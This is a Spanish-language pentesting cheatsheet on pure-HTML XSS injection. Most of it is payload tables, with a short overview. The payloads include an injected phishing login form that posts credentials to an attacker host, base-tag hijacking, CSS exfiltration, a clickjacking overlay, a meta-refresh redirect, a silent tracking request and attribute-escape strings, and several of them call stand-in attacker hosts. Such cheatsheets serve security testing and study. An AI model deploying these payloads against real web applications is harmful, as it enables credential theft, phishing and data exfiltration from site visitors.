---
aliases: null
tags:
  - vuln/xss
  - technique/execution
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[Cross-Site Scripting (XSS)]]'
---
# XSS - HTML Básico

***

## Cheatsheet

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<h1>PWNED</h1>` | Tag heading renderizado en página | Probe inicial — confirma que `<`/`>` no se escapan. |
| `<plaintext>` | Resto del HTML mostrado como texto plano | Probe rápido sin payload visible — diff vs render normal. |
| `<base href="https://attacker.com/">` | Todos los `src`/`href` relativos cargan de tu host | Base hijacking — interceptás scripts/imgs/forms de la página. |
| `<meta http-equiv="refresh" content="0;url=https://attacker.com">` | Redirección instantánea sin JS | Forzar navegación sin disparar CSP `script-src`. |
| `<form action="https://attacker/log" method="POST"><input name="u" placeholder="Usuario"><input name="p" placeholder="Password" type="password"><button>Login</button></form>` | Formulario phishing dentro del dominio víctima | Captura de creds aprovechando HTTPS válido. |
| `<link rel="stylesheet" href="https://attacker/exfil.css">` | CSS injection — exfil char-by-char con `:has`/atributos | Cuando JS está bloqueado. |
| `<iframe src="https://attacker/clickjack" style="position:fixed;width:100%;height:100%;border:0"></iframe>` | Overlay full-page del sitio atacante | Clickjacking persistente cuando XFO no está. |
| `<object data="https://attacker/x.swf"></object>` | Carga plugin Flash/SWF (legacy) | Targets con SWF aún habilitado. |
| `<body background="https://attacker/ping.png">` | GET silencioso a tu server | Tracking/exfil ciega sin JS. |
| `<img src="x" onerror="alert(1)">` | XSS via event handler (chain con HTML básico) | Si tags básicos pasan pero `<script>` está filtrada. |
^xss-html

### Cuando el input se refleja en un contexto cerrado

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `"><h1>PWNED</h1>` | Cierra atributo, sale al HTML body | Reflejo en `<input value="INYECCIÓN">`. |
| `'><h1>PWNED</h1>` | Misma idea, comillas simples | Reflejo en `value='INYECCIÓN'`. |
| `</textarea><h1>PWNED</h1>` | Cierra textarea/title/style/xmp protector | Reflejo dentro de etiquetas que tratan contenido como texto. |
| `--><h1>PWNED</h1>` | Cierra comentario HTML | Reflejo dentro de `<!-- INYECCIÓN -->`. |
^xss-html-escapes

___

## Overview

HTML injection puro (sin JS) sigue siendo XSS-clase explotable. Permite **phishing** (form inyectado), **base hijacking** (rerouting de recursos), **CSS exfil** (sin JS), **clickjacking**, **redirect**, **silent tracking**. Útil cuando filtros bloquean `<script>`/`on*` pero permiten tags básicas.

Combinable con event handlers → ver [[XSS - Manejadores de Eventos HTML]] para upgrade a JS execution.

***
